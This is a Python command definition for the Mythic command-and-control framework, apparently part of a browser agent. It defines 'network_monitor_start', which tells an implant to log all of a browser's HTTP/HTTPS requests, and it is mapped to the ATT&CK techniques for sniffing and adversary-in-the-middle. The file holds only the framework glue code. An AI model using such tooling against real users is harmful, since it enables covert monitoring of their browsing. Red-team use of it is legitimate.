from mythic_container.MythicCommandBase import (
    CommandBase, TaskArguments, CommandParameter, ParameterType,
    MythicTask, PTTaskMessageAllData, PTTaskProcessResponseMessageResponse,
    CommandAttributes,
)


class NetworkMonitorStartArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class NetworkMonitorStartCommand(CommandBase):
    cmd            = "network_monitor_start"
    needs_admin    = False
    help_cmd       = "network_monitor_start"
    description    = (
        "Begin logging all HTTP/HTTPS requests made by the browser (URL, method, "
        "status code, content-type). Stop with network_monitor_stop to retrieve results."
    )
    version        = 1
    author         = "@asaurusrex"
    argument_class = NetworkMonitorStartArguments
    parameters     = []
    attackmapping  = ["T1040", "T1557"]
    attributes     = CommandAttributes(filter_by_build_parameter={}, supported_os=[])

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        task.display_params = ""
        return task

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
